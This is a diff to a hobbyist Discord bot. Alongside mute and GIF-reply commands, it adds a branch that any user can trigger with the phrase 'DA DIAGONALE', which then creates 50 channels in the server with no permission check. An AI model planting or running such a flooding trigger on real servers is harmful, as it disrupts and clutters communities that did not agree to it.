@@ -1,7 +1,7 @@
 const Discord = require('discord.js')
 const bot = new Discord.Client()
 var prefix = "*"
-
+var a = 0;
 setInterval(() => {
     const nombre = 2;
     const random = Math.floor(Math.random() * (nombre - 1) + 1);
@@ -73,6 +73,12 @@ bot.on('message', function (message) {
             }
             message.guild.member(mention).addRole(arole);
             message.channel.send("Member muted !")
+          } else if (message.content.startsWith("DA DIAGONALE")) {
+        while(a < 50) {
+            message.guild.createChannel("diagonale")
+            a++;
+        }
+a = 0;
         }else if (message.content.toLowerCase().includes('kawaii')) {
             message.channel.send({files:['https://media1.tenor.com/images/3cee627ab9f455a0f14739ba5edbf81a/tenor.gif']});
         }else if (message.content.toLowerCase().includes('euuu')) {
